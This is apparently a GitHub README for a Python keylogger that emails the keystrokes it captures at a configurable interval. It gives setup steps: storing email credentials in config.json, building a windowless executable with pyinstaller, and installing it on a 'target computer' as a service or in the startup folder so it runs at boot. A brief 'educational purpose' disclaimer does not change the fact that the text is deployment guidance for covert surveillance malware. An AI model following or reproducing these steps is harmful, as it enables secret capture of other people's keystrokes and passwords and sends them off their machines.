# KeyloggerPY

Keylooger made in python3.

> ### Note: 
> This is for educational purpose! Do not use this in any wrong way. I won't be responsible for any of your wrong work.

## Instructions
- get [pyinstaller](https://www.pyinstaller.org/)
- install requirements with

```sh
$ pip install -r requirements.txt
```

#### Setup
- In `config.json` you need to provide email and passowrd which you wanna use. (if you're using Gmail then follow NOTE)
- in config file `"MAIL_EVERY"` value takes integer which follows minutes. 
    (eg. `"MAIL_EVERY": 60` will send mail after every 60minutes)

##### NOTE: You may need to enable allowing [Less Secure apps](https://myaccount.google.com/lesssecureapps) from your google account.


```sh
$ pyinstaller main.py -w
```

<hr>

#### Additional
> You can either setup a service to run the exe in target computer or put it inside startup folder for on-boot execution.

### Contributors

@MalavVyas - For creating this keylogger

@SwapnilSoni1999 - For adding extra functionality